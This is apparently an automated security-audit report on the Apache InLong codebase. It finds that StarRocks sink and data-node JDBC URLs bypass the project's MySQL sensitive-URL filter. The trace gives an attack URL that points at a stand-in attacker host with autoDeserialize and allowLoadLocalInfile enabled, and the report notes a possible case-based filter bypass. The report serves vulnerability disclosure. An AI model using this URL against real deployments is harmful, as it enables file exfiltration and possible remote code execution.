candidates.attacker_control: The StarRocks sink JDBC URL is fully user-controlled (StarRocksSinkRequest.jdbcUrl, only a no-whitespace pattern), as is a StarRocks data-node URL (used verbatim by the resource operator). The user also controls whether resource creation runs (enableCreateResource defaults to 1) and which host/port the URL points to, so they can point it at a MySQL-protocol server they operate.
candidates.counterevidence_checked: Checked that (a) MySQLSinkDTO.getFromRequest and MySQLDataNodeDTO.convertToJdbcurl/StarRocksDataNodeOperator.testConnection do call MySQLSensitiveUrlUtils.filterSensitive, showing the intended control; (b) no other global/Jackson/MyBatis hook applies this filter (grep for MySQLSensitiveUrlUtils/filterSensitive/allowLoadLocalInfile/autoDeserialize shows only the four usages); (c) UrlVerificationUtils.extractHostAndValidatePortFromJdbcUrl does not strip properties, it only validates the jdbc:mysql://host:port[:port] shape; (d) StarRocksSinkRequest's only URL validation is a no-whitespace @Pattern; (e) enableCreateResource defaults to 1 (SinkRequest line 101), so resource creation is normally enabled; (f) the sort StarRocks factory does no URL sanitization and StarRocksLoadNode forwards jdbc-url untouched. The residual issues (MySQLSensitiveUrlUtils' case-sensitive parser key matching for allowLoadLocalInfileInPath, and the sort base JdbcUrlUtils.replaceInvalidUrlProperty handling only autoDeserialize=true) were noted but not used as the primary claim because they depend on driver-internal property-matching semantics I could not verify from this snapshot.
candidates.impact: Server-side connections to an attacker-chosen MySQL-protocol endpoint with attacker-chosen MySQL Connector/J properties. With allowLoadLocalInfile/allowUrlInLocalInfile, the malicious server can request local files and receive their contents (arbitrary file read/exfiltration from the manager and sort hosts, e.g. credentials/configs). With autoDeserialize=true, Connector/J deserializes server-provided data during result handling, which is the well-known JDBC deserialization attack that can lead to remote code execution when a usable gadget chain is on the classpath. The project itself classifies these parameters as security-sensitive, which is why MySQLSensitiveUrlUtils exists.
candidates.prerequisites: An authenticated manager user able to save/update a stream sink (e.g. tenant operator role, POST /api/sink/save) or to create/use a StarRocks data node, and the standard group/stream workflow that triggers StarRocksResourceOperator.createSinkResource (enableCreateResource=1 by default; approval policy is deployment-specific). The attacker needs a reachable MySQL-protocol endpoint they control. The manager/sort hosts must run MySQL Connector/J (manager uses com.mysql.cj.jdbc.Driver and ships mysql-connector-java 8.0.28; StarRocksJdbcUtils hard-codes it).
candidates.root_cause: The project maintains MySQLSensitiveUrlUtils.filterSensitive() to strip/neutralize MySQL Connector/J properties that enable the classic JDBC connection-URL attack (autoDeserialize, allowLoadLocalInfile, allowUrlInLocalInfile, allowLoadLocalInfileInPath), and applies it to MySQL sink URLs (MySQLSinkDTO.getFromRequest) and to MySQL/StarRocks data-node test connections (StarRocksDataNodeDTO.convertToJdbcUrl). The StarRocks sink and StarRocks resource-creation paths never call that filter: the user-supplied jdbcUrl is copied verbatim into stream_sink.ext_params (StarRocksSinkDTO.getFromRequest), a raw data-node URL is copied verbatim in StarRocksSinkOperator.getFromEntity / StarRocksResourceOperator.getStarRocksInfo, and the value is then handed to DriverManager.getConnection(url, ...) with com.mysql.cj.jdbc.Driver (StarRocksJdbcUtils.getConnection). The same unfiltered URL is also emitted into the sort config (StarRocksProvider -> StarRocksLoadNode.tableOptions() jdbc-url) and consumed by the sort StarRocks connector via StarRocksJdbcConnectionProvider, so the MySQL driver in the sort cluster parses the attacker properties as well. UrlVerificationUtils.extractHostAndValidatePortFromJdbcUrl only checks the host:port shape and does not remove these properties, and StarRocksSinkRequest only rejects whitespace in the URL.
candidates.title: StarRocks sink/data-node JDBC URL bypasses MySQLSensitiveUrlUtils, enabling JDBC URL attack (local file read / possible deserialization RCE)
candidates.trace: 1) POST /api/sink/save with sinkType=STARROCKS and jdbcUrl such as jdbc:mysql://attacker.example:3306/db?autoDeserialize=true&allowLoadLocalInfile=true&allowUrlInLocalInfile=true (or a StarRocks data node with the same URL). 2) StreamSinkController -> StreamSinkServiceImpl -> StarRocksSinkOperator.setTargetEntity -> StarRocksSinkDTO.getFromRequest copies request.getJdbcUrl() into StreamSinkEntity.extParams with no MySQLSensitiveUrlUtils.filterSensitive call (contrast MySQLSinkDTO.getFromRequest lines 85-90). 3) When the group/stream resource workflow runs, StarRocksResourceOperator.createSinkResource -> getStarRocksInfo -> createTable uses that URL (or the raw data-node URL from StarRocksSinkOperator.getFromEntity line 103) and calls StarRocksJdbcUtils.getConnection -> UrlVerificationUtils (host:port shape only) -> DriverManager.getConnection(url, user, password) with com.mysql.cj.jdbc.Driver, so the attacker-controlled Connector/J properties are applied while connecting to the attacker's server. 4) Separately, StarRocksProvider emits the same URL into StarRocksLoadNode (tableOptions() puts jdbc-url), and the sort StarRocks connector builds StarRocksJdbcConnectionProvider from sinkOptions.getJdbcUrl() without any filter, so TaskManagers make the same connection.
candidates.unverified: No code was executed and no external services were contacted. The exact effect of autoDeserialize/allowLoadLocalInfile is based on documented MySQL Connector/J behavior and on InLong's own denylist, not on runtime testing; whether a usable deserialization gadget exists on the manager/sort classpath was not verified. The third-party com.starrocks.connector.flink.connection.StarRocksJdbcConnectionProvider is not present in this repository, so its DriverManager.getConnection use is inferred from the manager-side code and from how sinkOptions.getJdbcUrl() is passed to it. The precise workflow/approval conditions under which StarRocksResourceOperator runs in each deployment were not exhaustively verified.
candidates.weakness_type: JDBC URL property injection / missing input sanitization (CWE-20), leading to deserialization of untrusted data (CWE-502)

coverage_summary: Reviewed the assigned 6,184-file snapshot with repository-relative listing/search/read tools. Main areas inspected: inlong-manager (web controllers, auth/Shiro filters, service layer, sink/data-node/resource operators, MyBatis mappers with ${} order-by, JDBC URL filters), inlong-sort (sort-common protocol/load nodes, Flink JDBC/StarRocks/MySQL-CDC connectors, JdbcUrlUtils), inlong-agent (installer/module command execution, file task/path handling, offset stores), inlong-dataproxy (config servlet, HTTP/TCP sources), inlong-audit and inlong-sdk/dataproxy-sdk (JDBC sinks, config loading, ObjectInputStream use). The snapshot contains no test sources. Third-party dependency internals (MySQL Connector/J, StarRocks Flink connector) and much of inlong-tubemq and inlong-dashboard TypeScript were not exhaustively reviewed; only read-only inspection was performed (no builds, tests, or runtime checks).
limitations: No code execution, build, or dynamic verification; all conclusions are from source reading plus documented driver behavior.

MySQL Connector/J 8.0.28 semantics for autoDeserialize/allowLoadLocalInfile/allowLoadLocalInfileInPath are inferred from the project's own denylist and public knowledge of that driver, not tested here.
The StarRocks Flink connector's JDBC connection provider is a third-party class not present in the snapshot; its DriverManager usage is inferred from call sites.
Workflow/approval gating that determines when StarRocksResourceOperator.createSinkResource actually runs is deployment-configurable and was not fully traced for every profile.
inlong-tubemq internals, dashboard TypeScript, and large unrelated portions of the 6,184 files were not deeply reviewed; absence of findings there is not evidence of absence.

rejected_leads.lead: MySQLSensitiveUrlUtils.filterSensitive parser uses exact-case containsKey when rebuilding query params, so a differently-cased key such as ALLOWLOADLOCALINFILEINPATH could survive while the appended false values do not cover it.
rejected_leads.reason: This is a plausible residual bypass of the MySQL filter, but it depends on MySQL Connector/J property-name matching being case-insensitive, which is driver-internal and not verifiable from this snapshot; the same goes for any '=' vs ':' separator behavior. Kept as an unconfirmed lead rather than the primary candidate.

Weak defense-in-depth, but for the MySQL sink the manager already strips those properties before the URL reaches sort, so by itself it needs a separate bypass to be exploitable. It is relevant only in combination with the unfiltered StarRocks/OceanBase paths.

rejected_leads.lead: ModuleController/PackageController endpoints (/api/module/save, /api/package/save) have no @RequiresRoles while similar global admin endpoints do, and module configs contain install/start/stop commands executed by agent-installers.
rejected_leads.reason: Authorization-model concern; impact depends on deployment privileges/tenant roles and on agent installer workflows, and it is not clear that non-admin users are intended to be blocked here (module/package configs are global admin resources). No direct command injection in the reviewed code.

rejected_leads.lead: OpenAPI endpoints (/openapi/**) default to openapi.auth.enabled=false and authenticate as the 'admin' default user.
rejected_leads.reason: Explicit, documented design (application.properties comment and OpenAPIFilter/OpenAPIAuthenticatingRealm code) intended for internal component traffic; not a code-level validation defect.

rejected_leads.lead: ShellExecutorImpl/CommandExecutorImpl build shell command strings from cluster/module configuration (e.g. modifyConfig, execRemote) and run them via sh -c or expect scripts.
rejected_leads.reason: Values come from cluster-admin-managed configuration and the operations are RCE-by-design on managed nodes; no lower-privileged input reliably reaches the interpolated command strings in the reviewed paths.

summary: Static review of the Apache InLong 2.1.0-SNAPSHOT source tree (6,184 files; no test sources present in the snapshot). I surveyed the manager (web/controller/service/pojo/dao), agent, sort protocol and Flink connectors, dataproxy, audit and SDK modules, focusing on attacker-controlled data reaching dangerous sinks (JDBC DriverManager calls, JDBC URL construction, command execution, file access, deserialization, SQL/URL filters). One candidate is submitted: the StarRocks JDBC URL path never applies the repository's own MySQL sensitive-URL filter, so an authenticated user who can save a StarRocks sink (or refer to a StarRocks data node) can force the manager and the sort cluster to open a MySQL Connector/J connection to an attacker-controlled endpoint with dangerous connection properties (autoDeserialize / allowLoadLocalInfile / allowUrlInLocalInfile), the exact class of properties the codebase filters elsewhere. Other leads (MySQL URL-filter residual parsing gaps, the sort-side JDBC URL filter covering only autoDeserialize=true, module/package endpoints lacking role annotations, OpenAPI auth disabled by default) are noted as unconfirmed/rejected because they either need driver-internal assumptions or are explicit design decisions.
